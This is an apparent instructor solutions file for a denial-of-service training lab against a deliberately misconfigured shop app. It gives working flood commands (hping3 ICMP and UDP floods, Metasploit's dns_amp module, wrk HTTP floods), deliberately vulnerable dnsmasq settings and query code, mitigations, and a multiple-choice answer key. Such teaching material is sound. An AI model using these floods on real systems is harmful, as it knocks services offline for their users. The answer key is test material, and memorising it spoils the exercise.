# Solutions — TrackShop DoS Training Lab

> **Instructor / self-study reference.**  
> Read this file only after attempting the exercises in `QnA.md`.

---

## Part 1 — Network Layer DoS (ICMP Flood)

### Vulnerability Explanation

The Nginx and backend containers run inside a Docker bridge network with no upstream firewall filtering ICMP traffic.  
The kernel's network interrupt handler must process every incoming Echo Request, consuming CPU time proportional to the packet rate.  
Because no `iptables` rule rate-limits ICMP, the attacker can send as many packets as the network link allows.

### Step-by-Step Attack

**Step 1 — Set your target IP**

Open `http://<your-pod-ip>/` in a browser. The dashboard displays the target IP in the dark banner at the top of the page. Use that value for all commands.

```bash
# Replace with the IP shown on the TrackShop dashboard
export TARGET=<pod-ip>      # e.g. export TARGET=10.10.10.5
```

**Step 2 — Baseline ping**

```bash
ping -c 5 $TARGET
# Note the round-trip time (RTT) before the attack starts.
```

**Step 3 — Launch ICMP flood**

```bash
# Requires root — sends 1 packet per microsecond at maximum speed
sudo hping3 --icmp --flood -V $TARGET
```

`--icmp`  → use ICMP Echo Request  
`--flood` → send as fast as possible (no inter-packet delay)  
`-V`      → verbose — shows packet counters  

**Step 4 — Observe impact (second terminal)**

```bash
# Watch ping RTT rise during the flood
ping $TARGET

# Time a real HTTP request — latency should increase noticeably
time curl -s http://$TARGET/api/health
```

**Step 6 — Stop the attack**

```bash
# Press Ctrl-C in the hping3 terminal
```

### Expected Observable Effects

| Metric | Before Attack | During Attack |
|--------|--------------|---------------|
| ICMP RTT (ms) | < 1 ms | 5–50 ms |
| Nginx CPU % | < 5 % | 30–80 % |
| HTTP `/health` response time | ~5 ms | 50–500 ms |

### Root Cause

No ICMP rate-limit rule exists anywhere in the packet path between the attacker and the target container.

### Mitigation

```bash
# Add an iptables rule to limit ICMP to 10 packets/second
iptables -A INPUT -p icmp --icmp-type echo-request \
  -m limit --limit 10/second --limit-burst 20 -j ACCEPT
iptables -A INPUT -p icmp --icmp-type echo-request -j DROP
```

In production: configure this at the upstream firewall / cloud security group, not on the server itself.

---

## Part 2 — Service Layer DoS (DNS Flood via hping3 / Metasploit)

### Vulnerability Explanation

The lab runs a **dnsmasq** DNS resolver intentionally misconfigured for maximum susceptibility:

| Setting | Value | Effect |
|---------|-------|--------|
| `cache-size` | `0` | Every query is computed fresh — no cached response reuse |
| `dns-forward-max` | `500` | No per-client rate limiting |
| TXT records | ~300 bytes each | Amplified response size for every query |

Because dnsmasq must process each UDP query independently (no cache hits), a flood of queries at even modest rates saturates CPU and causes the DNS service to stop answering legitimate requests.

### Lab Configuration

```ini
# docker/dnsmasq.conf (standalone) / dns/dnsmasq.conf (compose)
cache-size=0          # intentional — no cache, every query freshly computed
dns-forward-max=500   # intentional — no rate limit per client
```

The DNS service is reachable on **port 53/udp** of the lab host (same IP shown on the TrackShop dashboard).

### Prerequisites

> **Both hping3 and Metasploit's dns_amp module send raw UDP packets.**  
> This requires `CAP_NET_RAW` on the **attacker machine** (not inside the container).  
> Always run `sudo`. If you see a permission error, you forgot sudo.

### Step-by-Step Attack

**Step 1 — Set your target IP**

```bash
# Use the IP shown on the TrackShop dashboard
export TARGET=<pod-ip>      # e.g. export TARGET=10.10.10.5

# Confirm DNS is reachable before the attack
dig @$TARGET trackshop.local
# Should return: trackshop.local. 0 IN A 127.0.0.1 (or 172.28.0.30 in compose)
```

**Step 2a — Launch DNS flood with hping3**

```bash
# UDP flood to port 53 — saturates the dnsmasq query processing loop
sudo hping3 --udp -p 53 --flood -V $TARGET
```

`--udp`   → send UDP datagrams  
`-p 53`   → destination port 53 (DNS)  
`--flood` → send as fast as possible  
`-V`      → verbose packet counter  

**Step 2b — (Alternative) Launch DNS amplification flood via Metasploit**

```bash
# MUST be sudo — raw packet sockets require CAP_NET_RAW on the attacker machine
sudo msfconsole -q
```

```
msf6 > use auxiliary/dos/dns/dns_amp
msf6 auxiliary(dos/dns/dns_amp) > show options

msf6 auxiliary(dos/dns/dns_amp) > set RESOLVER $TARGET   # the dnsmasq server
msf6 auxiliary(dos/dns/dns_amp) > set VICTIM   $TARGET   # same target
msf6 auxiliary(dos/dns/dns_amp) > set THREADS 8
msf6 auxiliary(dos/dns/dns_amp) > run
```

**Step 3 — Verify service disruption (separate terminal)**

```bash
# DNS queries should time out while the flood is running
dig @$TARGET trackshop.local
# → ;; connection timed out; no servers could be reached

# Confirm web service is unaffected — HTTP should still respond
curl -s http://$TARGET/api/health
```

**Step 4 — Observe impact**

```bash
# Watch CPU spike in the container
docker stats dos --no-stream    # standalone
docker stats dos_lab_dns --no-stream   # compose
```

**Step 5 — Stop the attack**

```bash
# Press Ctrl-C in the hping3 terminal
# or in Metasploit:
msf6 auxiliary(dos/dns/dns_amp) > stop
```

### Expected Observable Effects

| Metric | Normal | Under DNS Flood |
|--------|--------|----------------|
| `dig @$TARGET trackshop.local` | ~1 ms, correct A record | Timeout (no answer) |
| dnsmasq container CPU % | < 5 % | 80–100 % |
| `docker stats` network RX | < 1 KB/s | 10–100+ MB/s |
| Legitimate HTTP curl | 200 OK | Unaffected (DNS and HTTP are independent in this lab) |

### Root Cause

1. `cache-size=0` — dnsmasq recomputes every response from scratch regardless of how many times the same name is queried.
2. `dns-forward-max=500` — no limit on queries accepted per client per second; the resolver accepts the full flood rate.
3. Large TXT records — each query triggers a ~300-byte response, amplifying outbound traffic.

### Mitigation

```ini
# Enable caching — responses for repeated queries are served instantly
cache-size=1000

# Rate-limit queries per client to 5 per second
dns-ratelimit=5
```

```bash
# Also rate-limit UDP port 53 at the firewall
iptables -A INPUT -p udp --dport 53 \
  -m limit --limit 100/second --limit-burst 200 -j ACCEPT
iptables -A INPUT -p udp --dport 53 -j DROP
```

---

## Part 3 — Application Layer DoS (HTTP Flood via wrk)

### Exercise 3a — Search Endpoint Flood

#### Vulnerability Explanation

`GET /api/search?q=<term>` runs:

```sql
SELECT p.*, COUNT(oi.id), SUM(oi.quantity)
  FROM products p
  LEFT JOIN order_items oi ON oi.product_id = p.id
 WHERE p.name        ILIKE '%term%'
    OR p.description ILIKE '%term%'
    OR p.category    ILIKE '%term%'
 GROUP BY p.id
```

The **leading wildcard** (`%term%`) prevents any B-tree index from being used → **full sequential scan** on every request.  
Combined with a LEFT JOIN to `order_items`, cost grows as data grows.  
There is **no caching** and **no rate limiting**.

#### Attack Commands

```bash
# Use the IP shown on the TrackShop dashboard
export TARGET=<pod-ip>      # e.g. export TARGET=10.10.10.5

# Moderate — 4 threads, 100 concurrent connections, 60 seconds
wrk -t 4 -c 100 -d 60s \
  "http://$TARGET/api/search?q=wireless"

# Heavy — 4 threads, 200 concurrent connections
wrk -t 4 -c 200 -d 60s \
  "http://$TARGET/api/search?q=a"
```

**Interpret `wrk` output:**

```
Running 60s test @ http://<pod-ip>/api/search?q=a
  4 threads and 200 connections

  Thread Stats   Avg      Stdev     Max
    Latency      2.34s    1.02s    8.50s
    Req/Sec      12.00    10.23    80.00
  Requests/sec:  48.00
  Transfer/sec:  22.10KB
```

- **Latency avg > 2 s** — server is struggling.  
- **Req/Sec drops to < 50** — throughput is severely degraded.

#### Observe degradation from the attacker

```bash
# Watch latency climb during the flood — run in a separate terminal
while true; do
  curl -s -o /dev/null -w "search RTT: %{time_total}s\n" \
    "http://$TARGET/api/search?q=test"
  sleep 2
done
```

#### Expected Effects

| Before flood | During flood |
|-------------|-------------|
| < 50 ms response | 1–8 s response |
| PostgreSQL CPU < 5 % | PostgreSQL CPU 60–100 % |
| 200 OK | 200 OK (degraded) or 502/504 |

---

### Exercise 3b — Reports Endpoint Flood

#### Vulnerability Explanation

`GET /api/reports` sequentially executes:

1. **Category aggregation** — 90-day window, JOINs across `orders`, `order_items`, `products`.
2. **Daily volume** — group-by DATE over 30 days.
3. **Top customers** — aggregate across all users + orders.
4. **CPU spin** — a JavaScript loop of 200,000 `Math.sqrt` + `Math.log` iterations simulates report rendering.

No background worker, no cache — all work repeats **on every single HTTP request**.

#### Attack Commands

```bash
# 4 threads, 100 concurrent — enough to saturate Node.js single-thread
wrk -t 4 -c 100 -d 60s "http://$TARGET/api/reports"
```

**Combining search and reports simultaneously (two terminals):**

```bash
# Terminal 1
wrk -t 4 -c 100 -d 60s "http://$TARGET/api/reports"

# Terminal 2
wrk -t 4 -c 100 -d 60s "http://$TARGET/api/search?q=cable"
```

#### Observe saturation from the attacker

```bash
# Reports endpoint RTT should climb to several seconds
while true; do
  curl -s -o /dev/null -w "reports RTT: %{time_total}s\n" \
    "http://$TARGET/api/reports"
  sleep 3
done
```

---

### Exercise 3c — Orders Endpoint Flood

#### Vulnerability Explanation

`GET /api/orders` runs a base query for all orders, then issues **one additional DB query per order row** (N+1 pattern):

```javascript
const enriched = await Promise.all(
  orders.map(async (order) => {
    const { rows: items } = await pool.query(
      `SELECT ... FROM order_items JOIN products WHERE order_id = $1`,
      [order.id]
    );
    return { ...order, items };
  })
);
```

With 500 orders in the database that is **501 DB queries per HTTP request**.  
Under flood conditions the 10-connection DB pool (`max: 10`) is exhausted instantly.

#### Attack Commands

```bash
wrk -t 8 -c 200 -d 60s "http://$TARGET/api/orders"
```

#### Observe pool exhaustion

```bash
# Orders endpoint will begin returning 500 errors or timing out
for i in $(seq 1 5); do
  curl -s -o /dev/null -w "orders: %{http_code} %{time_total}s\n" \
    "http://$TARGET/api/orders"
done
```

#### Expected Effects

| Before flood | During flood |
|-------------|-------------|
| ~200 ms response | 5–30 s response or timeout |
| DB pool idle | Pool fully saturated, requests queue |
| 0 errors | 500 Internal Server Errors |

---

## Answer Key — Multiple Choice Questions

| Q# | Correct Answer |
|----|---------------|
| Q1  | **A** — ICMP |
| Q2  | **D** — Network bandwidth and CPU interrupt handling |
| Q3  | **B** — `--icmp` |
| Q4  | **D** — Rate-limiting ICMP on a firewall or upstream router |
| Q5  | **B** — UDP |
| Q6  | **D** — DNS queries time out and domain names cannot be resolved |
| Q7  | **A** — Every DNS query must be freshly computed, multiplying CPU and I/O load per request |
| Q8  | **D** — Full PostgreSQL table scan using a leading-wildcard LIKE query |
| Q9  | **C** — Opens many concurrent connections across multiple threads simultaneously |
| Q10 | **A** — Implement server-side caching and background report generation with rate limiting |

---

*TrackShop DoS Lab — for educational use only.*
